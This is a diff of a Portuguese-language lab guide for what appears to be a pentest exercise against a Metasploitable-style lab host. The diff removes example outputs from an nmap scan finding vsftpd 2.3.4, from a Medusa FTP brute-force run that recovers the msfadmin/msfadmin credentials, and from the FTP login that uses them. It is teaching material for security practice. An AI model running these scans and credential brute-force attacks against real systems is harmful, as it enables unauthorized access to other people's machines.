@@ -97,28 +97,6 @@ nmap → Programa de varredura de portas e enumeração de rede.
 
 ### Exemplo de saída:
 
-──(kali㉿kali)-[~]
-└─$ nmap -sV -p 21,22,80,139,445 192.168.10.3                         
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 17:12 EDT
-Nmap scan report for 192.168.10.3
-Host is up (0.0027s latency).
-
-PORT    STATE SERVICE     VERSION
-21/tcp  open  ftp         vsftpd 2.3.4
-| ftp-syst: 
-|   STAT: 
-| FTP server status:
-|      Connected to 192.168.10.4
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      vsFTPd 2.3.4 - secure, fast, stable
-|_End of status
-|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
-
 ![Tela de acesso](images/portas.png)
 
  ## 2) Lista de contas / senhas para teste (wordlists simples)
@@ -184,21 +162,6 @@ O que significam as flags:
 
 ### Exemplo de saída esperada quando encontra credenciais:
 
-┌──(kali㉿kali)-[~/wordlists]
-└─$ medusa -h 192.168.10.3 -U ~/wordlists/users.txt -P ~/wordlists/passwords.txt -M ftp -t 6 -f
-
-Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
-
-2025-10-07 17:50:37 ACCOUNT CHECK: [ftp] Host: 192.168.10.3 (1 of 1, 0 complete) User: msfadmin (1 of 10, 0 complete) Password: msfadmin (1 of 10 complete)
-#### 2025-10-07 17:50:37 ACCOUNT FOUND: [ftp] Host: 192.168.10.3 User: msfadmin Password: msfadmin [SUCCESS]
-2025-10-07 17:50:38 ACCOUNT CHECK: [ftp] Host: 192.168.10.3 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: admin (2 of 10 complete)
-2025-10-07 17:50:38 ACCOUNT CHECK: [ftp] Host: 192.168.10.3 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: password (3 of 10 complete)
-2025-10-07 17:50:38 ACCOUNT CHECK: [ftp] Host: 192.168.10.3 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: msf (4 of 10 complete)
-2025-10-07 17:50:40 ACCOUNT CHECK: [ftp] Host: 192.168.10.3 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: root (5 of 10 complete)
-2025-10-07 17:50:40 ACCOUNT CHECK: [ftp] Host: 192.168.10.3 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: toor (6 of 10 complete)
-                                                                                                                                                                                            
-┌──(kali㉿kali)-[~/wordlists]
-└─$ 
 ![Tela de acesso](images/sucesso user pass.png)
 
 ## 4) Teste de conexão FTP com as credenciais encontradas
@@ -213,18 +176,6 @@ Name (192.168.10.3:youruser): msfadmin
 Password: msfadmin
 
 ### Exemplo de Saída esperada:
-
-┌──(kali㉿kali)-[~/wordlists]
-└─$ ftp 192.168.10.3
-Connected to 192.168.10.3.
-220 (vsFTPd 2.3.4)
-Name (192.168.10.3:kali): msfadmin
-331 Please specify the password.
-Password: 
-#### 230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> 
 
 ![Tela de acesso](images/ftp sucesso.png)
 
